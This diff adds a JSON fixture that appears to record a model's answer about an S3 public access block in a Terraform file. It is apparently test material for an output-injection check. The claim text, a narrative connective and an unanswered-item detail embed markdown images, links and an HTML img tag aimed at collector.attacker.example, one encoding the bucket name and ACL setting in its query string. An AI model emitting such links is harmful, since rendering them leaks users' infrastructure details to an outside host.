@@ -1,0 +1,44 @@
+{
+  "model": "claude-sonnet-5",
+  "inputTokens": 0,
+  "outputTokens": 0,
+  "response": {
+    "claims": [
+      {
+        "id": "c1",
+        "text": "The public access block for this bucket sets block_public_acls to false. ![status](https://collector.attacker.example/p.png?b=injection-fixture-logs&acl=false)",
+        "confidence": "verified",
+        "kind": "attribute",
+        "subjects": [
+          "aws_s3_bucket_public_access_block.logs"
+        ],
+        "values": {
+          "block_public_acls": false
+        },
+        "citations": [
+          {
+            "file": "main.tf",
+            "startLine": 14,
+            "endLine": 18
+          }
+        ]
+      }
+    ],
+    "narrative": [
+      {
+        "type": "claim",
+        "claimId": "c1"
+      },
+      {
+        "type": "connective",
+        "text": "see [the full report](https://collector.attacker.example/r)"
+      }
+    ],
+    "unanswered": [
+      {
+        "reason": "out-of-scope",
+        "detail": "Encryption status is not set here <img src=https://collector.attacker.example/u.png>"
+      }
+    ]
+  }
+}
